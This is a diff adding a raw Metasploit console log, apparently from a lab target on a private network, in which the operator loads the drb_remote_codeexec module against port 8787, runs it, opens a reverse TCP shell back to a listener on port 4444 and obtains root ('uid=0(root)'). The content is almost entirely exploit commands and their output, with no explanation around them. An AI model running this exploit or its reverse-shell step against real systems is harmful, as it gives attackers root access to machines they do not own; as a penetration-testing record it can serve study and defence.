@@ -1,0 +1,44 @@
+msf5 exploit(multi/http/tomcat_mgr_upload) > use exploit/linux/misc/drb_remote_codeexec 
+msf5 exploit(linux/misc/drb_remote_codeexec) > show options 
+
+Module options (exploit/linux/misc/drb_remote_codeexec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.1.31     no        The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8787             yes       The target port
+   URI                      no        The URI of the target host (druby://host:port) (overrides RHOST/RPORT)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(linux/misc/drb_remote_codeexec) > run
+
+[*] Started reverse TCP double handler on 192.168.1.14:4444 
+[*] Trying to exploit instance_eval method
+[!] Target is not vulnerable to instance_eval method
+[*] Trying to exploit syscall method
+[*] attempting x86 execve of .3xIdiJVXFZC2TCCw
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo JjgKnxXQsZzNHioW;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "JjgKnxXQsZzNHioW\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 7 opened (192.168.1.14:4444 -> 192.168.1.31:50272) at 2020-05-10 23:44:00 +0200
+[+] Deleted .3xIdiJVXFZC2TCCw
+
+id
+uid=0(root) gid=0(root)
+
+
+
